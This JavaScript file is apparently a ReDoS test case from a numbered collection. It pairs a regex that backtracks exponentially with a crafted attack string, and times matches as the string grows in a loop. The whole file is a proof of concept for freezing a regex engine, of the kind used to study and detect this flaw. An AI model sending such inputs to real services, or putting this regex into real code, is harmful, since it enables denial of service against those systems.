/* 8377
 * ^((\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2)?)|(?:(?:\2)?(?:\,|\.|\!|\?)?))(?: (\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2|\3)?)|(?:(?:\2|\3)?(?:\,|\.|\!|\?)?)))*)$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"a"+" A'A"*32+"◎@! _1_EOA(i or ii)"
 */
var REGEX = /^((\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2)?)|(?:(?:\2)?(?:\,|\.|\!|\?)?))(?: (\'|\")?[a-zA-Z]+(?:\-[a-zA-Z]+)?(?:s\'|\'[a-zA-Z]{1,2})?(?:(?:(?:\,|\.|\!|\?)?(?:\2|\3)?)|(?:(?:\2|\3)?(?:\,|\.|\!|\?)?)))*)$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'a' + ' A\'A'.repeat(i*1) + '◎@! _1_EOA(i or ii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}